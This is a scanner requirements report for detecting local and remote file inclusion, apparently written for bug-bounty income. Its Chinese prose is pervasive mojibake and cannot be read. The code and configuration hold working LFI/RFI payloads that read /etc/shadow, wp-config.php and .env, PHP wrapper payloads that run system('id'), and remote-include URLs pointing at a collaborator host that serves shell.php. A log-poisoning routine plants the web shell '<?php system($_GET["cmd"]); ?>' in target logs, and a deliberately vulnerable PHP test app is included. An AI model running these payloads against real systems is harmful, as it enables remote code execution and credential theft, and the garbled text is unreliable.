# ğŸ¯ æœ¬åœ°/é ç¨‹æ–‡ä»¶åŒ…å«æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š (LFI/RFI Detection)

## ğŸ“ æ¨¡çµ„éƒ¨ç½²ä½ç½®
```
services/integration/capability/file_inclusion/
â”œâ”€â”€ __init__.py
â”œâ”€â”€ __main__.py
â”œâ”€â”€ lfi_detector.py                   # æœ¬åœ°æ–‡ä»¶åŒ…å«æª¢æ¸¬å™¨
â”œâ”€â”€ rfi_detector.py                   # é ç¨‹æ–‡ä»¶åŒ…å«æª¢æ¸¬å™¨
â”œâ”€â”€ file_inclusion_scanner.py         # çµ±ä¸€æƒæå”èª¿å™¨
â”œâ”€â”€ payload_server.py                 # é ç¨‹è¼‰è·æœå‹™å™¨
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ lfi_patterns.json
â”‚   â”œâ”€â”€ rfi_patterns.json
â”‚   â”œâ”€â”€ target_files.json
â”‚   â””â”€â”€ detection_rules.json
â”œâ”€â”€ payloads/
â”‚   â”œâ”€â”€ lfi_payloads.json
â”‚   â”œâ”€â”€ rfi_payloads.json
â”‚   â”œâ”€â”€ log_poisoning_payloads.json
â”‚   â””â”€â”€ wrapper_payloads.json
â””â”€â”€ tests/
    â”œâ”€â”€ test_lfi_detector.py
    â”œâ”€â”€ test_rfi_detector.py
    â””â”€â”€ test_integration.py
```

## ğŸ”— ç›¸é—œæ¨¡çµ„é€£çµ
- [å‘½ä»¤æ³¨å…¥æª¢æ¸¬](./11_å‘½ä»¤æ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«ä»£ç¢¼åŸ·è¡Œæª¢æ¸¬é‚è¼¯
- [æœå‹™å™¨ç«¯æ¨¡æ¿æ³¨å…¥æª¢æ¸¬](./12_æœå‹™å™¨ç«¯æ¨¡æ¿æ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«ä»£ç¢¼åŸ·è¡Œæª¢æ¸¬
- [ç›®éŒ„éæ­·æ”»æ“Šæª¢æ¸¬](./13_ç›®éŒ„éæ­·æ”»æ“Šæª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - æ ¸å¿ƒæŠ€è¡“é‡ç–Š
- [XXEæ³¨å…¥æª¢æ¸¬](./15_XXEæ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«å¤–éƒ¨å¯¦é«”è¼‰å…¥æª¢æ¸¬
- [NoSQLæ³¨å…¥æª¢æ¸¬](./16_NoSQLæ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«è¼‰è·æ³¨å…¥æŠ€è¡“

**å ±å‘Šç·¨è™Ÿ**: FEAT-014  
**æ—¥æœŸ**: 2025å¹´11æœˆ7æ—¥  
**ç‹€æ…‹**: ğŸ”¥ ç©©å®šæ”¶ç›Š - ä¸­ç­‰è¤‡é›œåº¦  
**å„ªå…ˆç´š**: P1 (High Priority)  
**é æœŸæ”¶ç›Š**: $50K-90K/å¹´  
**OWASP ç·¨è™Ÿ**: WSTG-07-11.1/11.2

---

## ğŸ“Š å¸‚å ´éœ€æ±‚åˆ†æ

### ğŸ’° è³é‡‘åƒ¹å€¼è©•ä¼°
- **å…¸å‹è³é‡‘ç¯„åœ**: $300-$3,000
- **ç™¼ç¾é »ç‡**: é«˜ (40-60%çš„PHP/å‹•æ…‹èªè¨€æ‡‰ç”¨å­˜åœ¨é¢¨éšª)
- **æª¢æ¸¬æˆåŠŸç‡**: 80-90% (éœ€è¦ä¸Šä¸‹æ–‡ç†è§£)
- **å¹´æ”¶ç›Šé æ¸¬**: $50K-90K

### ğŸ¯ ç›®æ¨™æŠ€è¡“æ£§åˆ†å¸ƒ
- **PHPæ‡‰ç”¨**: 60%å¸‚å ´ä½”æœ‰ç‡ (include, requireå‡½æ•¸)
- **Pythonæ‡‰ç”¨**: 20%å¸‚å ´ä½”æœ‰ç‡ (exec, evalå‡½æ•¸)
- **ASP.NETæ‡‰ç”¨**: 10%å¸‚å ´ä½”æœ‰ç‡ (Server.Execute)
- **Javaæ‡‰ç”¨**: 8%å¸‚å ´ä½”æœ‰ç‡ (include tags)
- **å…¶ä»–èªè¨€**: 2%å¸‚å ´ä½”æœ‰ç‡

### ğŸš¨ é«˜é¢¨éšªå ´æ™¯
- CMSç³»çµ± (WordPress, Drupal) - 85%é¢¨éšª
- æ–‡ä»¶ç®¡ç†å™¨ - 80%é¢¨éšª
- æ¨¡æ¿ç³»çµ± - 75%é¢¨éšª
- å¤šèªè¨€ç¶²ç«™ - 70%é¢¨éšª
- API Gateway - 60%é¢¨éšª

---

## ğŸ” æŠ€è¡“éœ€æ±‚è¦æ ¼

### **æ¨¡çµ„æ¨™è­˜**
```
æœå‹™è·¯å¾‘: services/integration/capability/file_inclusion/
æ¨¡çµ„åç¨±: Local/Remote File Inclusion Detection Engine
è²¬ä»»åœ˜éšŠ: Advanced Security Research Team
å¯¦ç¾èªè¨€: Python (ä¸»å¼•æ“) + Go (æ€§èƒ½çµ„ä»¶)
è¤‡é›œåº¦ç´šåˆ¥: Medium-High
```

### **æ ¸å¿ƒæª¢æ¸¬èƒ½åŠ›**

#### 1ï¸âƒ£ **LFIæª¢æ¸¬å¼•æ“**
```python
class LFIDetector:
    """æœ¬åœ°æ–‡ä»¶åŒ…å«æª¢æ¸¬å™¨"""
    
    def __init__(self):
        self.lfi_payloads = self._load_lfi_payloads()
        self.file_signatures = self._load_file_signatures()
        self.wrappers = self._load_php_wrappers()
        
    def _load_lfi_payloads(self):
        """è¼‰å…¥LFIæ¸¬è©¦è¼‰è·"""
        return {
            'basic_lfi': [
                # åŸºæœ¬æ–‡ä»¶åŒ…å«
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/proc/version',
                '/proc/self/environ',
                
                # Windowsæ–‡ä»¶
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\windows\\win.ini',
                'C:\\windows\\system.ini',
                
                # ç›¸å°è·¯å¾‘
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                
                # æ‡‰ç”¨æ–‡ä»¶
                '../config.php',
                '../wp-config.php',
                '../.env',
                '../database.yml',
            ],
            
            'php_wrappers': [
                # PHPå”è­°åŒ…è£å™¨
                'php://filter/convert.base64-encode/resource=/etc/passwd',
                'php://filter/read=string.rot13/resource=/etc/passwd',
                'php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd',
                
                # æ•¸æ“šå”è­°
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',  # <?php phpinfo(); ?>
                'data://text/plain,<?php phpinfo(); ?>',
                
                # ZIPå”è­°
                'zip://shell.zip#shell.php',
                'phar://shell.phar/shell.php',
                
                # è¼¸å…¥æµ
                'php://input',
                'php://stdin'
            ],
            
            'null_byte': [
                # NULLå­—ç¯€æˆªæ–· (èˆŠç‰ˆPHP)
                '/etc/passwd%00',
                '/etc/passwd%00.jpg',
                '../config.php%00.txt',
                'php://filter/resource=/etc/passwd%00',
            ],
            
            'encoding_bypass': [
                # ç·¨ç¢¼ç¹é
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '....//....//....//etc//passwd',
                '..\/..\/..\/etc\/passwd',
            ]
        }
    
    def detect_lfi(self, target_url, parameter):
        """æª¢æ¸¬æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"""
        detections = []
        
        for category, payloads in self.lfi_payloads.items():
            for payload in payloads:
                result = self._test_lfi_payload(target_url, parameter, payload, category)
                if result:
                    detections.append(result)
                    
        return detections
    
    def _test_lfi_payload(self, url, param, payload, category):
        """æ¸¬è©¦å–®å€‹LFIè¼‰è·"""
        
        # æ§‹é€ æ¸¬è©¦URL
        test_url = self._build_test_url(url, param, payload)
        
        # ç™¼é€è«‹æ±‚
        response = self._send_request(test_url)
        if not response:
            return None
            
        # åˆ†æéŸ¿æ‡‰
        return self._analyze_lfi_response(response, payload, category)
    
    def _analyze_lfi_response(self, response, payload, category):
        """åˆ†æLFIéŸ¿æ‡‰"""
        
        content = response.text.lower()
        
        # æª¢æŸ¥æ–‡ä»¶ç‰¹å¾µ
        for file_path, signatures in self.file_signatures.items():
            if any(sig in content for sig in signatures):
                return {
                    'type': 'Local File Inclusion',
                    'category': category,
                    'payload': payload,
                    'detected_file': file_path,
                    'confidence': self._calculate_confidence(content, signatures),
                    'evidence': self._extract_evidence(content, signatures[:3])
                }
        
        # æª¢æŸ¥PHPéŒ¯èª¤
        php_errors = [
            'failed to open stream',
            'no such file or directory',
            'permission denied',
            'include_path',
            'fopen()',
            'include()',
            'require()'
        ]
        
        if any(error in content for error in php_errors):
            return {
                'type': 'Local File Inclusion',
                'category': 'error_disclosure',
                'payload': payload,
                'confidence': 0.6,
                'evidence': 'PHP file inclusion error detected'
            }
            
        return None
```

#### 2ï¸âƒ£ **RFIæª¢æ¸¬å¼•æ“**
```python
class RFIDetector:
    """é ç¨‹æ–‡ä»¶åŒ…å«æª¢æ¸¬å™¨"""
    
    def __init__(self, collaborator_server):
        self.collaborator_server = collaborator_server
        self.rfi_payloads = self._generate_rfi_payloads()
        
    def _generate_rfi_payloads(self):
        """ç”ŸæˆRFIæ¸¬è©¦è¼‰è·"""
        base_url = f"http://{self.collaborator_server}"
        
        return {
            'basic_rfi': [
                # åŸºæœ¬é ç¨‹åŒ…å«
                f"{base_url}/test.php",
                f"{base_url}/test.txt",
                f"{base_url}/shell.php",
                
                # å¸¶åƒæ•¸
                f"{base_url}/test.php?cmd=phpinfo",
                f"{base_url}/callback.php?target={{TARGET}}",
            ],
            
            'protocol_variations': [
                # HTTPå”è­°
                f"http://{self.collaborator_server}/test.php",
                f"https://{self.collaborator_server}/test.php",
                
                # FTPå”è­°
                f"ftp://anonymous:pass@{self.collaborator_server}/test.php",
                
                # SMBå”è­° (Windows)
                f"\\\\{self.collaborator_server}\\share\\test.php",
                f"file://{self.collaborator_server}/test.php",
            ],
            
            'encoding_bypass': [
                # URLç·¨ç¢¼
                f"http%3A%2F%2F{self.collaborator_server}%2Ftest.php",
                
                # åå…­é€²åˆ¶ç·¨ç¢¼
                self._encode_hex(f"http://{self.collaborator_server}/test.php"),
                
                # é›™é‡ç·¨ç¢¼
                f"http%253A%252F%252F{self.collaborator_server}%252Ftest.php",
            ]
        }
    
    def detect_rfi(self, target_url, parameter):
        """æª¢æ¸¬é ç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"""
        detections = []
        
        for category, payloads in self.rfi_payloads.items():
            for payload in payloads:
                result = self._test_rfi_payload(target_url, parameter, payload, category)
                if result:
                    detections.append(result)
                    
        return detections
    
    def _test_rfi_payload(self, url, param, payload, category):
        """æ¸¬è©¦RFIè¼‰è·"""
        
        # ç”Ÿæˆå”¯ä¸€æ¨™è­˜
        test_id = f"rfi-{uuid.uuid4().hex[:8]}"
        
        # æ§‹é€ å¸¶æ¨™è­˜çš„è¼‰è·
        test_payload = payload.replace('test.php', f'{test_id}.php')
        
        # æ§‹é€ æ¸¬è©¦URL
        test_url = self._build_test_url(url, param, test_payload)
        
        # ç™¼é€è«‹æ±‚
        response = self._send_request(test_url)
        
        # æª¢æŸ¥å”ä½œæœå‹™å™¨æ—¥èªŒ
        time.sleep(5)  # ç­‰å¾…è«‹æ±‚åˆ°é”
        
        if self._check_collaborator_interaction(test_id):
            return {
                'type': 'Remote File Inclusion',
                'category': category,
                'payload': test_payload,
                'confidence': 0.95,
                'evidence': f'Remote server interaction detected: {test_id}'
            }
            
        return None
```

#### 3ï¸âƒ£ **é«˜ç´šæª¢æ¸¬æŠ€è¡“**
```python
class AdvancedLFIRFIDetector:
    """é«˜ç´šLFI/RFIæª¢æ¸¬æŠ€è¡“"""
    
    def detect_log_poisoning(self, target_url, parameter):
        """æª¢æ¸¬æ—¥èªŒæ±¡æŸ“æ”»æ“Š"""
        
        # å¸¸è¦‹æ—¥èªŒæ–‡ä»¶è·¯å¾‘
        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/httpd/access_log',
            'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex*.log',
            '/proc/self/environ',
            '/var/log/mail.log',
            '/var/log/auth.log'
        ]
        
        detections = []
        
        for log_file in log_files:
            # æ­¥é©Ÿ1ï¼šæ±¡æŸ“æ—¥èªŒ
            poison_payload = '<?php system($_GET["cmd"]); ?>'
            self._poison_log(target_url, poison_payload)
            
            # æ­¥é©Ÿ2ï¼šåŒ…å«æ—¥èªŒæ–‡ä»¶
            lfi_payload = log_file
            result = self._test_log_inclusion(target_url, parameter, lfi_payload, poison_payload)
            
            if result:
                detections.append({
                    'type': 'Log Poisoning + LFI',
                    'log_file': log_file,
                    'payload': lfi_payload,
                    'confidence': 0.9,
                    'evidence': 'Log poisoning successful'
                })
                
        return detections
    
    def detect_session_inclusion(self, target_url, parameter):
        """æª¢æ¸¬æœƒè©±æ–‡ä»¶åŒ…å«"""
        
        # PHPæœƒè©±æ–‡ä»¶è·¯å¾‘
        session_paths = [
            '/tmp/sess_{{SESSIONID}}',
            '/var/lib/php/sessions/sess_{{SESSIONID}}',
            '/var/lib/php5/sess_{{SESSIONID}}',
            'C:\\Windows\\Temp\\sess_{{SESSIONID}}',
        ]
        
        # ç²å–æœƒè©±ID
        session_id = self._get_session_id(target_url)
        if not session_id:
            return []
            
        detections = []
        
        for session_path in session_paths:
            # æ›¿æ›æœƒè©±ID
            actual_path = session_path.replace('{{SESSIONID}}', session_id)
            
            # æ¸¬è©¦æœƒè©±æ–‡ä»¶åŒ…å«
            result = self._test_lfi_payload(target_url, parameter, actual_path, 'session_inclusion')
            
            if result:
                detections.append({
                    'type': 'Session File Inclusion',
                    'session_path': actual_path,
                    'session_id': session_id,
                    'confidence': 0.85,
                    'evidence': 'Session file successfully included'
                })
                
        return detections
    
    def detect_upload_inclusion(self, target_url, parameter):
        """æª¢æ¸¬ä¸Šå‚³æ–‡ä»¶åŒ…å«"""
        
        # å¸¸è¦‹ä¸Šå‚³ç›®éŒ„
        upload_paths = [
            '/uploads/',
            '/upload/',
            '/files/',
            '/tmp/',
            '/var/tmp/',
            '../uploads/',
            '../files/',
        ]
        
        detections = []
        
        # å˜—è©¦ä¸Šå‚³PHPæ–‡ä»¶
        php_content = '<?php echo "LFI_TEST_SUCCESS"; phpinfo(); ?>'
        
        for upload_path in upload_paths:
            # å˜—è©¦ä¸Šå‚³
            uploaded_file = self._attempt_upload(target_url, php_content)
            if not uploaded_file:
                continue
                
            # æ§‹é€ åŒ…å«è·¯å¾‘
            include_path = upload_path + uploaded_file
            
            # æ¸¬è©¦æ–‡ä»¶åŒ…å«
            result = self._test_lfi_payload(target_url, parameter, include_path, 'upload_inclusion')
            
            if result and 'LFI_TEST_SUCCESS' in result.get('evidence', ''):
                detections.append({
                    'type': 'Upload + LFI Chain',
                    'uploaded_file': uploaded_file,
                    'include_path': include_path,
                    'confidence': 0.95,
                    'evidence': 'Uploaded file successfully included and executed'
                })
                
        return detections
```

---

## ğŸ—ï¸ æ¶æ§‹è¨­è¨ˆ

### **æ¨¡çµ„çµæ§‹**
```
services/integration/capability/file_inclusion/
â”œâ”€â”€ cmd/
â”‚   â””â”€â”€ main.go                    # Goæœå‹™å…¥å£
â”œâ”€â”€ internal/
â”‚   â”œâ”€â”€ detector/
â”‚   â”‚   â”œâ”€â”€ lfi_detector.py        # LFIæª¢æ¸¬å¼•æ“
â”‚   â”‚   â”œâ”€â”€ rfi_detector.py        # RFIæª¢æ¸¬å¼•æ“
â”‚   â”‚   â”œâ”€â”€ advanced_detector.py   # é«˜ç´šæª¢æ¸¬æŠ€è¡“
â”‚   â”‚   â”œâ”€â”€ payload_generator.py   # è¼‰è·ç”Ÿæˆå™¨
â”‚   â”‚   â””â”€â”€ signature_matcher.py   # æ–‡ä»¶ç‰¹å¾µåŒ¹é…
â”‚   â”œâ”€â”€ engine/
â”‚   â”‚   â”œâ”€â”€ scanner.py             # ä¸»æƒæå¼•æ“
â”‚   â”‚   â”œâ”€â”€ collaborator.py        # å”ä½œæœå‹™å™¨
â”‚   â”‚   â””â”€â”€ reporter.py            # å ±å‘Šç”Ÿæˆå™¨
â”‚   â””â”€â”€ worker/
â”‚       â”œâ”€â”€ amqp_consumer.go       # æ¶ˆæ¯æ¶ˆè²»è€…
â”‚       â””â”€â”€ task_processor.go      # ä»»å‹™è™•ç†å™¨
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ payloads/
â”‚   â”‚   â”œâ”€â”€ lfi_basic.yaml         # åŸºæœ¬LFIè¼‰è·
â”‚   â”‚   â”œâ”€â”€ lfi_wrappers.yaml      # PHPåŒ…è£å™¨è¼‰è·
â”‚   â”‚   â”œâ”€â”€ rfi_protocols.yaml     # RFIå”è­°è¼‰è·
â”‚   â”‚   â””â”€â”€ encoding_bypass.yaml   # ç·¨ç¢¼ç¹éè¼‰è·
â”‚   â”œâ”€â”€ signatures/
â”‚   â”‚   â”œâ”€â”€ system_files.yaml      # ç³»çµ±æ–‡ä»¶ç‰¹å¾µ
â”‚   â”‚   â”œâ”€â”€ config_files.yaml      # é…ç½®æ–‡ä»¶ç‰¹å¾µ
â”‚   â”‚   â””â”€â”€ application_files.yaml # æ‡‰ç”¨æ–‡ä»¶ç‰¹å¾µ
â”‚   â””â”€â”€ rules.yaml                 # æª¢æ¸¬è¦å‰‡
â”œâ”€â”€ collaborator/
â”‚   â”œâ”€â”€ server.py                  # å”ä½œæœå‹™å™¨
â”‚   â”œâ”€â”€ log_collector.py           # æ—¥èªŒæ”¶é›†å™¨
â”‚   â””â”€â”€ interaction_tracker.py     # äº¤äº’è¿½è¹¤å™¨
â””â”€â”€ tests/
    â”œâ”€â”€ unit/
    â”œâ”€â”€ integration/
    â””â”€â”€ vulnerable_apps/           # æ¸¬è©¦æ‡‰ç”¨
```

### **æª¢æ¸¬å·¥ä½œæµ**
```mermaid
graph TD
    A[ç›®æ¨™URL] --> B[åƒæ•¸åˆ†æ]
    B --> C[LFIæª¢æ¸¬]
    C --> D[åŸºæœ¬æ–‡ä»¶åŒ…å«]
    D --> E[PHPåŒ…è£å™¨]
    E --> F[ç·¨ç¢¼ç¹é]
    F --> G[é«˜ç´šLFIæŠ€è¡“]
    G --> H{æª¢æ¸¬åˆ°LFI?}
    H -->|Yes| I[RFIæª¢æ¸¬]
    H -->|No| I
    I --> J[å”ä½œæœå‹™å™¨è¨­ç½®]
    J --> K[é ç¨‹æ–‡ä»¶è«‹æ±‚]
    K --> L[äº¤äº’æª¢æ¸¬]
    L --> M{æª¢æ¸¬åˆ°RFI?}
    M -->|Yes| N[çµæœåˆä½µ]
    M -->|No| O[å˜—è©¦é«˜ç´šæŠ€è¡“]
    O --> P[æ—¥èªŒæ±¡æŸ“]
    P --> Q[æœƒè©±åŒ…å«]
    Q --> R[ä¸Šå‚³åŒ…å«]
    R --> N
    N --> S[ç½®ä¿¡åº¦è¨ˆç®—]
    S --> T[SARIFå ±å‘Š]
```

---

## âš™ï¸ é…ç½®æ–‡ä»¶è¦æ ¼

### **ä¸»é…ç½®æ–‡ä»¶**
```yaml
# config/rules.yaml
lfi_rfi_detection:
  enabled: true
  timeout: 30
  max_payloads_per_param: 25
  
  lfi:
    enabled: true
    basic_files: true
    php_wrappers: true
    null_byte_attack: true
    encoding_bypass: true
    
    advanced_techniques:
      log_poisoning: true
      session_inclusion: true
      upload_inclusion: true
      proc_environ: true
      
  rfi:
    enabled: true
    collaborator_server: "rfi.aiva-security.com"
    protocols: ["http", "https", "ftp", "smb"]
    interaction_timeout: 30
    
  confidence_thresholds:
    high: 0.9
    medium: 0.7
    low: 0.5
    
  rate_limiting:
    requests_per_second: 5
    burst_limit: 10
    delay_between_requests: 200ms
```

### **LFIè¼‰è·é…ç½®**
```yaml
# config/payloads/lfi_basic.yaml
lfi_payloads:
  unix_system_files:
    - path: "/etc/passwd"
      signatures:
        - "root:x:0:0:"
        - "daemon:x:"
        - "nobody:x:"
      severity: "high"
      
    - path: "/etc/shadow"
      signatures:
        - "root:$"
        - ":$1$"
        - ":$6$"
      severity: "critical"
      
    - path: "/proc/version"
      signatures:
        - "Linux version"
        - "gcc version"
      severity: "medium"
      
  windows_system_files:
    - path: "C:\\windows\\win.ini"
      signatures:
        - "[fonts]"
        - "[extensions]"
      severity: "high"
      
    - path: "C:\\windows\\system32\\drivers\\etc\\hosts"
      signatures:
        - "127.0.0.1"
        - "localhost"
      severity: "medium"
      
  application_files:
    - path: "../config.php"
      signatures:
        - "$db_password"
        - "mysql_connect"
        - "<?php"
      severity: "critical"
      
    - path: "../wp-config.php"
      signatures:
        - "DB_PASSWORD"
        - "DB_HOST"
        - "wordpress"
      severity: "critical"
      
    - path: "../.env"
      signatures:
        - "DB_PASSWORD="
        - "API_KEY="
        - "SECRET_KEY="
      severity: "critical"
```

### **PHPåŒ…è£å™¨é…ç½®**
```yaml
# config/payloads/lfi_wrappers.yaml
php_wrappers:
  filter_wrappers:
    - "php://filter/convert.base64-encode/resource=/etc/passwd"
    - "php://filter/read=string.rot13/resource=/etc/passwd"
    - "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
    - "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
    
  data_protocol:
    - "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="  # <?php phpinfo(); ?>
    - "data://text/plain,<?php system('id'); ?>"
    - "data://text/plain,<?php echo file_get_contents('/etc/passwd'); ?>"
    
  zip_protocol:
    - "zip://shell.zip#shell.php"
    - "phar://shell.phar/shell.php"
    - "compress.zlib://data.txt"
    - "compress.bzip2://data.txt"
    
  input_streams:
    - "php://input"
    - "php://stdin"
    - "php://fd/0"
    - "php://memory"
    - "php://temp"
```

---

## ğŸ§ª æ¸¬è©¦ç­–ç•¥

### **æ¼æ´æ‡‰ç”¨æ­å»º**
```php
<?php
// tests/vulnerable_apps/lfi_rfi_test.php

// LFIæ¼æ´ - ç›´æ¥åŒ…å«
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
}

// LFIæ¼æ´ - ç›¸å°è·¯å¾‘
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include("pages/" . $page . ".php");
}

// RFIæ¼æ´ - é ç¨‹åŒ…å«
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    include($url);
}

// éæ¿¾ç¹éæ¸¬è©¦
if (isset($_GET['template'])) {
    $template = $_GET['template'];
    // ç°¡å–®éæ¿¾
    $template = str_replace('../', '', $template);
    include("templates/" . $template);
}

// NULLå­—ç¯€æ¸¬è©¦
if (isset($_GET['doc'])) {
    $doc = $_GET['doc'];
    include("docs/" . $doc . ".txt");
}
?>
```

### **è‡ªå‹•åŒ–æ¸¬è©¦**
```python
class TestLFIRFIDetection:
    def setup_method(self):
        self.detector = LFIRFIDetector()
        self.test_server = "http://localhost:8080"
        
    def test_basic_lfi_detection(self):
        """æ¸¬è©¦åŸºæœ¬LFIæª¢æ¸¬"""
        target = f"{self.test_server}/lfi_test.php"
        
        results = self.detector.scan_lfi(target, 'file')
        
        assert len(results) > 0
        assert any(r['type'] == 'Local File Inclusion' for r in results)
        assert any('/etc/passwd' in r.get('detected_file', '') for r in results)
        
    def test_php_wrapper_detection(self):
        """æ¸¬è©¦PHPåŒ…è£å™¨æª¢æ¸¬"""
        target = f"{self.test_server}/lfi_test.php"
        
        results = self.detector.scan_lfi(target, 'file')
        
        wrapper_detected = any(
            'php://filter' in r.get('payload', '') for r in results
        )
        assert wrapper_detected
        
    def test_rfi_detection(self):
        """æ¸¬è©¦RFIæª¢æ¸¬"""
        target = f"{self.test_server}/rfi_test.php"
        
        results = self.detector.scan_rfi(target, 'url')
        
        assert len(results) > 0
        assert any(r['type'] == 'Remote File Inclusion' for r in results)
        
    def test_advanced_techniques(self):
        """æ¸¬è©¦é«˜ç´šæª¢æ¸¬æŠ€è¡“"""
        target = f"{self.test_server}/advanced_test.php"
        
        # æ¸¬è©¦æ—¥èªŒæ±¡æŸ“
        log_results = self.detector.detect_log_poisoning(target, 'file')
        
        # æ¸¬è©¦æœƒè©±åŒ…å«
        session_results = self.detector.detect_session_inclusion(target, 'file')
        
        # è‡³å°‘æœ‰ä¸€ç¨®é«˜ç´šæŠ€è¡“æˆåŠŸ
        assert len(log_results) > 0 or len(session_results) > 0
```

---

## ğŸ“ˆ æ€§èƒ½è¦æ±‚

### **æƒææ€§èƒ½**
- **å–®ç›®æ¨™æƒææ™‚é–“**: < 90ç§’ (åŒ…å«é«˜ç´šæŠ€è¡“)
- **ä¸¦ç™¼è«‹æ±‚æ•¸**: 10å€‹ä¸¦ç™¼é€£æ¥
- **RFIäº¤äº’ç­‰å¾…æ™‚é–“**: 30ç§’
- **å…§å­˜ä½¿ç”¨**: < 256MB/å¯¦ä¾‹

### **æª¢æ¸¬æº–ç¢ºç‡**
- **LFIæª¢æ¸¬æˆåŠŸç‡**: > 85%
- **RFIæª¢æ¸¬æˆåŠŸç‡**: > 80%
- **é«˜ç´šæŠ€è¡“æˆåŠŸç‡**: > 70%
- **èª¤å ±ç‡**: < 5%

---

## ğŸš€ å¯¦æ–½è¨ˆåŠƒ

### **Phase 1: åŸºç¤LFIæª¢æ¸¬ (2é€±)**
- [ ] LFIæª¢æ¸¬å¼•æ“
- [ ] åŸºæœ¬æ–‡ä»¶åŒ…å«è¼‰è·
- [ ] æ–‡ä»¶ç‰¹å¾µåŒ¹é…å™¨
- [ ] PHPåŒ…è£å™¨æ”¯æŒ

### **Phase 2: RFIæª¢æ¸¬ç³»çµ± (2é€±)**
- [ ] å”ä½œæœå‹™å™¨æ­å»º
- [ ] RFIæª¢æ¸¬å¼•æ“
- [ ] äº¤äº’è¿½è¹¤ç³»çµ±
- [ ] å¤šå”è­°æ”¯æŒ

### **Phase 3: é«˜ç´šæª¢æ¸¬æŠ€è¡“ (2é€±)**
- [ ] æ—¥èªŒæ±¡æŸ“æª¢æ¸¬
- [ ] æœƒè©±æ–‡ä»¶åŒ…å«
- [ ] ä¸Šå‚³æ–‡ä»¶åŒ…å«
- [ ] ç·¨ç¢¼ç¹éæŠ€è¡“

### **Phase 4: é›†æˆå’Œå„ªåŒ– (1é€±)**
- [ ] çµæœæ•´åˆå’Œå»é‡
- [ ] æ€§èƒ½å„ªåŒ–
- [ ] SARIFå ±å‘Šç”Ÿæˆ
- [ ] æ¸¬è©¦å’Œéƒ¨ç½²

**ç¸½é–‹ç™¼å‘¨æœŸ**: 7é€±  
**é è¨ˆä¸Šç·šæ™‚é–“**: 2025å¹´12æœˆ26æ—¥

---

## ğŸ’¼ å•†æ¥­åƒ¹å€¼

### **æ”¶ç›Šåˆ†æ**
- **å¹´åº¦è³é‡‘æ”¶å…¥**: $50K-90K
- **é–‹ç™¼æŠ•è³‡**: $70K (7é€±é–‹ç™¼)
- **ROI**: 71%-129%
- **å›æ”¶å‘¨æœŸ**: 9-12å€‹æœˆ

### **æŠ€è¡“åƒ¹å€¼**
- **æª¢æ¸¬è¦†è“‹ç‡**: æå‡è‡³45%
- **è¤‡é›œæ”»æ“Šéˆ**: æ”¯æŒå¤šéšæ®µæ”»æ“Šæª¢æ¸¬
- **æŠ€è¡“å·®ç•°åŒ–**: å°‘æ•¸æ”¯æŒé«˜ç´šLFI/RFIæŠ€è¡“çš„å·¥å…·

---

## ğŸ“‹ é©—æ”¶æ¨™æº–

### **åŠŸèƒ½é©—æ”¶**
- âœ… æ”¯æŒåŸºæœ¬LFI/RFIæª¢æ¸¬
- âœ… PHPåŒ…è£å™¨å®Œæ•´æ”¯æŒ
- âœ… å”ä½œæœå‹™å™¨ç©©å®šé‹è¡Œ
- âœ… é«˜ç´šæª¢æ¸¬æŠ€è¡“æœ‰æ•ˆ
- âœ… å¤šå¹³å°æ–‡ä»¶ç‰¹å¾µè­˜åˆ¥

### **æ€§èƒ½é©—æ”¶**
- âœ… æƒææ™‚é–“<90ç§’/ç›®æ¨™
- âœ… LFIæˆåŠŸç‡>85%
- âœ… RFIæˆåŠŸç‡>80%
- âœ… èª¤å ±ç‡<5%

---

## ğŸ¯ çµè«–

LFI/RFIæª¢æ¸¬æ¨¡çµ„æ˜¯ä¸€å€‹**ä¸­ç­‰è¤‡é›œåº¦ã€ç©©å®šæ”¶ç›Š**çš„æˆ°ç•¥æ€§é …ç›®ã€‚å…¶æŠ€è¡“æŒ‘æˆ°é©ä¸­ï¼Œä½†æ”¶ç›Šç©©å®šï¼Œç‰¹åˆ¥æ˜¯é«˜ç´šæª¢æ¸¬æŠ€è¡“å°‡æˆç‚ºé‡è¦çš„ç«¶çˆ­å·®ç•°åŒ–å› ç´ ã€‚

**å»ºè­°ä½œç‚ºç¬¬ä¸‰å„ªå…ˆç´šé …ç›®**ï¼Œåœ¨ç›®éŒ„éæ­·å’Œå‘½ä»¤æ³¨å…¥æ¨¡çµ„å®Œæˆå¾Œå¯¦æ–½ã€‚